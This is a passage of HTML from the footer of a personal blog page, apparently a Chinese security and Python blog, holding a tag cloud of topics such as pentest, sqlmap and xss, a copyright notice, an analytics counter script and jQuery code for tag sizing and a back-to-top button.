                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/des" title="des">des</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/git" title="git">git</a>
                <sup>6</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/javascript" title="javascript">javascript</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/linux" title="linux">linux</a>
                <sup>21</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/markdown" title="markdown">markdown</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/metasploit" title="metasploit">metasploit</a>
                <sup>2</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/miscellanea" title="miscellanea">miscellanea</a>
                <sup>3</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/mysql" title="mysql">mysql</a>
                <sup>6</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/nessus" title="nessus">nessus</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/nmap" title="nmap">nmap</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/pentest" title="pentest">pentest</a>
                <sup>7</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/php" title="php">php</a>
                <sup>11</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/plan" title="plan">plan</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/poc" title="poc">poc</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/python" title="python">python</a>
                <sup>29</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/python%e6%a8%a1%e5%9d%97" title="python模块">python模块</a>
                <sup>10</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/server" title="server">server</a>
                <sup>9</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/shell" title="shell">shell</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/sqlmap" title="sqlmap">sqlmap</a>
                <sup>2</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/ssrf" title="ssrf">ssrf</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/tornado" title="tornado">tornado</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/windows" title="windows">windows</a>
                <sup>7</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/wireless" title="wireless">wireless</a>
                <sup>2</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/xml" title="xml">xml</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/xss" title="xss">xss</a>
                <sup>3</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c" title="代码执行">代码执行</a>
                <sup>2</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/%e4%bf%a1%e6%81%af%e6%b3%84%e6%bc%8f" title="信息泄漏">信息泄漏</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/%e4%bf%a1%e6%81%af%e6%b3%84%e9%9c%b2" title="信息泄露">信息泄露</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c" title="命令执行">命令执行</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/%e5%b7%a5%e5%85%b7" title="工具">工具</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/%e6%8f%90%e6%9d%83" title="提权">提权</a>
                <sup>5</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0" title="文件上传">文件上传</a>
                <sup>4</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab" title="文件包含">文件包含</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/%e6%b3%a8%e5%85%a5" title="注入">注入</a>
                <sup>9</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/%e7%88%86%e7%a0%b4" title="爆破">爆破</a>
                <sup>4</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/%e7%ab%af%e5%8f%a3%e8%bd%ac%e5%8f%91" title="端口转发">端口转发</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/%e7%bd%91%e7%bb%9c%e8%ae%be%e5%a4%87" title="网络设备">网络设备</a>
                <sup>2</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/%e8%99%9a%e6%8b%9f%e6%9c%ba" title="虚拟机">虚拟机</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/%e8%b6%8a%e6%9d%83" title="越权">越权</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/%e8%bd%af%e4%bb%b6" title="软件">软件</a>
                <sup>4</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/%e9%80%bb%e8%be%91%e6%bc%8f%e6%b4%9e" title="逻辑漏洞">逻辑漏洞</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="http://wyb0.com/tags/%e9%87%8d%e5%ae%9a%e5%90%91" title="重定向">重定向</a>
                <sup>1</sup>
            </p>
        
    </div>


</div>

                
<div style="padding-bottom:20px;">
    <h2 class="asidetitle">Links</h2>
    <div style="padding:5px 0px 10px 10px;">
        <a href="http://www.test404.com/">Test404's Blog</a>
    </div>
</div>
            </div>
        </div>
    </div>

    <br><br>
    
<div class="foot">
    <div class="copyright">
        
        &copy; 2016-2017 Reber. All Rights Reserved.

        
        <script type="text/javascript">
          var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
          document.write(unescape("%3Cspan id='cnzz_stat_icon_1261003390'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s11.cnzz.com/z_stat.php%3Fid%3D1261003390%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));
        </script>
    </div>
    <div class="social">
        
        
            <a href="https://github.com/reber-9" target="_blank"><i class="fa fa-github-square fa-fw"></i>GitHub</a>
        
        &nbsp;&nbsp;
        
            <a href="http://weibo.com/u/5819760166" target="_blank"><i class="fa fa-weibo fa-fw"></i>Weibo</a>
        
        &nbsp;&nbsp;
        <a href="http://wyb0.com/index.xml" target="_blank"><i class="fa fa-rss fa-fw"></i>RSS</a>
    </div>
</div>
</div>

    
    <script type="text/javascript">
    $(document).ready(function(){
        var alist = $('#tags p');
        alist.each(function () {
            var t = $(this);
            var a = t.find('a');
            var sup = parseInt(t.find('sup').text());
            t.find('sup').hide();

            if (0<sup && sup<6) {
                a.addClass("text8");
            } else if (5<sup && sup<11) {
                a.addClass("text7");
            } else if (10<sup && sup<16) {
                a.addClass("text6");
            } else if (15<sup && sup<21) {
                a.addClass("text5");
            } else if (20<sup && sup<26) {
                a.addClass("text4");
            } else if (25<sup && sup<31) {
                a.addClass("text3");
            } else if (30<sup && sup<36) {
                a.addClass("text2");
            } else {
                a.addClass("text1");
            }

        });
    });
    </script>

    
    <div class="goToTop">
      <a href="#top" id="goToTop">
        <img src="http://wyb0.com/img/goto_top.png" alt="可以返回顶部" title="回到顶部" style="display:block;" />
      </a>
    </div>
    <script type="text/javascript">
    $.fn.goToTop = function () {
        if ($(window).scrollTop()<400) {
            $('#goToTop').hide(); 
        }
        $(window).scroll(function () {
            if ($(this).scrollTop()>400) {
                $('#goToTop').fadeIn();
            } else {
                $('#goToTop').fadeOut();
            }
        });
        this.click(function () {
            $('html,body').animate({scrollTop:0},800);
            return false;
        });
    }
    $(document).ready(function () {
        $('#goToTop').goToTop();
    });
    </script>

    

</body>
</html>